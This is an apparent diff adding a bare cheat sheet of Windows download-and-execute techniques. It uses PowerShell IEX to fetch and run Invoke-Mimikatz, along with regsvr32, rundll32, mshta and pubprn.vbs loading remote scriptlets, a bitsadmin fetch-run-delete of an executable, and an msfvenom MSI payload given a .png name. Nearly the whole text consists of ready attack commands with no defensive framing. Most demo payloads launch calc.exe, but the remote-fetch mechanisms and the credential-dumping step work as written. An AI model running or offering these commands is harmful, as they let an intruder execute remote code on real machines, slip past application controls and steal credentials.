@@ -1,0 +1,53 @@
+## powershell
+powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
+
+## regsvr32
+regsvr32 /u /s /i:http://site.com/js.png scrobj.dll
+
+## js.png
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    progid="ShortJSRAT"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+    <!-- Learn from Casey Smith @subTee -->
+    <script language="JScript">
+        <![CDATA[
+            ps  = "cmd.exe /c calc.exe";
+            new ActiveXObject("WScript.Shell").Run(ps,0,true);
+
+        ]]>
+</script>
+</registration>
+</scriptlet>
+
+##rundll32
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}%
+
+##mshta
+1） mshta http://site.com/calc.hta
+2） mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
+3) <HTML>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD>
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "calc.exe"
+self.close
+</script>
+<body>
+demo
+</body>
+</HEAD>
+</HTML>
+
+## pubprn.vbs
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
+
+## bitsadmin
+cmd.exe /c bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&%APPDATA%\d90f.exe&del %APPDATA%\d90f.exe
+
+##
+msfvenom -f msi -p windows/exec CMD=calc.exe > cacl.png
